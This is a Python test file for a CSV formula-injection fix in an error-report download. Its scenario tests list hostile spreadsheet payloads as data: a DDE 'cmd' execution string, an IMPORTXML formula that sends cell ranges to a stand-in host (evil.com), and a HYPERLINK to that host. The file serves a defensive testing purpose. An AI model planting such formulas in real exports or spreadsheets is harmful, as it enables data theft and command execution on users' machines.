"""Tests for CSV injection vulnerability fix.

This test file validates that the CSV sanitization function properly
prevents formula injection attacks in the error report download.
"""

import pytest


class TestCSVSanitization:
    """Tests for CSV injection prevention."""

    def test_sanitize_formula_injection_equals(self):
        """Should sanitize values starting with equals sign."""
        # Simulating the JavaScript sanitizeCSVValue function behavior
        dangerous_value = "=1+1"
        # Expected: prefixed with single quote
        expected = "'=1+1"
        
        # In JavaScript, this would be: sanitizeCSVValue("=1+1")
        # Result should prevent formula execution
        assert dangerous_value.startswith('=')
        # The fix adds a single quote prefix
        sanitized = "'" + dangerous_value.replace('"', '""')
        assert sanitized == expected

    def test_sanitize_formula_injection_plus(self):
        """Should sanitize values starting with plus sign."""
        dangerous_value = "+1+1"
        expected = "'+1+1"
        
        assert dangerous_value.startswith('+')
        sanitized = "'" + dangerous_value.replace('"', '""')
        assert sanitized == expected

    def test_sanitize_formula_injection_minus(self):
        """Should sanitize values starting with minus sign."""
        dangerous_value = "-1+1"
        expected = "'-1+1"
        
        assert dangerous_value.startswith('-')
        sanitized = "'" + dangerous_value.replace('"', '""')
        assert sanitized == expected

    def test_sanitize_formula_injection_at_sign(self):
        """Should sanitize values starting with at sign."""
        dangerous_value = "@SUM(A1:A10)"
        expected = "'@SUM(A1:A10)"
        
        assert dangerous_value.startswith('@')
        sanitized = "'" + dangerous_value.replace('"', '""')
        assert sanitized == expected

    def test_sanitize_formula_injection_tab(self):
        """Should sanitize values starting with tab character."""
        dangerous_value = "\t=1+1"
        expected = "'\t=1+1"
        
        assert dangerous_value.startswith('\t')
        sanitized = "'" + dangerous_value.replace('"', '""')
        assert sanitized == expected

    def test_sanitize_normal_values(self):
        """Should not modify normal values."""
        normal_value = "Normal error message"
        # Normal values just get quotes escaped
        sanitized = normal_value.replace('"', '""')
        assert sanitized == "Normal error message"

    def test_sanitize_with_quotes(self):
        """Should escape double quotes in values."""
        value_with_quotes = 'Error: "file not found"'
        expected = 'Error: ""file not found""'
        
        sanitized = value_with_quotes.replace('"', '""')
        assert sanitized == expected

    def test_sanitize_dangerous_with_quotes(self):
        """Should handle dangerous characters with quotes."""
        dangerous_value = '=1+1 "test"'
        expected = '\'=1+1 ""test""'
        
        assert dangerous_value.startswith('=')
        sanitized = "'" + dangerous_value.replace('"', '""')
        assert sanitized == expected

    def test_csv_row_format(self):
        """Should format CSV rows correctly with sanitization."""
        errors = [
            {"file": "test.pdf", "error": "Normal error"},
            {"file": "malicious.pdf", "error": "=1+1"},
            {"file": "quote.pdf", "error": 'Error: "not found"'},
        ]
        
        # Simulate the CSV generation
        csv_rows = []
        for e in errors:
            file_val = e['file'].replace('"', '""')
            error_val = e['error']
            
            # Apply sanitization for dangerous characters
            if error_val.startswith(('=', '+', '-', '@', '\t', '\r')):
                error_val = "'" + error_val.replace('"', '""')
            else:
                error_val = error_val.replace('"', '""')
            
            csv_rows.append(f'"{file_val}","{error_val}"')
        
        assert csv_rows[0] == '"test.pdf","Normal error"'
        assert csv_rows[1] == '"malicious.pdf","\'=1+1"'
        assert csv_rows[2] == '"quote.pdf","Error: ""not found"""'

    def test_empty_values(self):
        """Should handle empty values gracefully."""
        empty_value = ""
        sanitized = empty_value.replace('"', '""')
        assert sanitized == ""

    def test_none_values(self):
        """Should handle None values gracefully."""
        # In JavaScript, this would be handled by the if (!value) check
        # Python equivalent:
        none_value = None
        sanitized = str(none_value) if none_value else ""
        assert sanitized == ""


class TestCSVInjectionScenarios:
    """Real-world CSV injection attack scenarios."""

    def test_excel_formula_attack(self):
        """Should prevent Excel formula execution."""
        # Attack: =cmd|'/c calc'!A1
        attack = "=cmd|'/c calc'!A1"
        sanitized = "'" + attack.replace('"', '""')
        
        # Verify it's prefixed with single quote
        assert sanitized.startswith("'")
        assert sanitized == "'=cmd|'/c calc'!A1"

    def test_google_sheets_formula_attack(self):
        """Should prevent Google Sheets formula execution."""
        # Attack: =IMPORTXML(CONCAT("http://evil.com/?",A1:A100),"//a")
        attack = '=IMPORTXML(CONCAT("http://evil.com/?",A1:A100),"//a")'
        sanitized = "'" + attack.replace('"', '""')
        
        assert sanitized.startswith("'")
        assert '""' in sanitized  # Quotes should be escaped

    def test_hyperlink_attack(self):
        """Should prevent hyperlink formula attacks."""
        # Attack: =HYPERLINK("http://evil.com","Click me")
        attack = '=HYPERLINK("http://evil.com","Click me")'
        sanitized = "'" + attack.replace('"', '""')
        
        assert sanitized.startswith("'")
        assert sanitized == '\'=HYPERLINK(""http://evil.com"",""Click me"")'

    def test_dde_attack(self):
        """Should prevent DDE (Dynamic Data Exchange) attacks."""
        # Attack: @SUM(1+1)*cmd|'/c calc'!A1
        attack = "@SUM(1+1)*cmd|'/c calc'!A1"
        sanitized = "'" + attack.replace('"', '""')
        
        assert sanitized.startswith("'")
        assert sanitized == "'@SUM(1+1)*cmd|'/c calc'!A1"

    def test_combined_attack_vectors(self):
        """Should handle multiple attack vectors in one value."""
        attacks = [
            "=1+1",
            "+1+1",
            "-1+1",
            "@SUM(A1:A10)",
            "\t=1+1",
            "\r=1+1",
        ]
        
        for attack in attacks:
            sanitized = "'" + attack.replace('"', '""')
            assert sanitized.startswith("'"), f"Failed to sanitize: {attack}"

